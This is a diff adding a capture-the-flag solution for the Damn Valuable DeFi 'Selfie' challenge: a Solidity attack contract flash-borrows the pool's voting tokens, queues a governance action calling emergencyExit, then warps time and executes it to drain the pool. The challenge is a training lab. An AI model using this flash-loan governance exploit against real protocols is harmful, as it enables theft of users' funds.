@@ -6,6 +6,42 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+import "forge-std/Vm.sol";
+
+contract Attack is IERC3156FlashBorrower, Test {
+    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
+
+    DamnValuableVotes votingToken;
+    SimpleGovernance governance;
+    SelfiePool pool;
+    address recovery;
+    uint256 actionCounter;
+
+    constructor(address _votingToken, address _governance, address _recovery, address _pool) {
+        votingToken = DamnValuableVotes(_votingToken);
+        governance = SimpleGovernance(_governance);
+        pool = SelfiePool(_pool);
+        recovery = _recovery;
+    }
+
+    function attack() external {
+        uint256 poolBalance = votingToken.balanceOf(address(pool));
+        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(votingToken), poolBalance, bytes(""));
+        vm.warp(block.timestamp + 2 days);
+        governance.executeAction(actionCounter);
+    }
+
+    function onFlashLoan(address sender, address token, uint256 amount, uint256 value, bytes calldata data)
+        external
+        returns (bytes32)
+    {
+        votingToken.delegate(address(this));
+        actionCounter = governance.queueAction(address(pool), 0, abi.encodeCall(pool.emergencyExit, (recovery)));
+        votingToken.approve(msg.sender, amount);
+        return CALLBACK_SUCCESS;
+    }
+}
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,7 +98,8 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        Attack att = new Attack(address(token), address(governance), recovery, address(pool));
+        att.attack();
     }
 
     /**
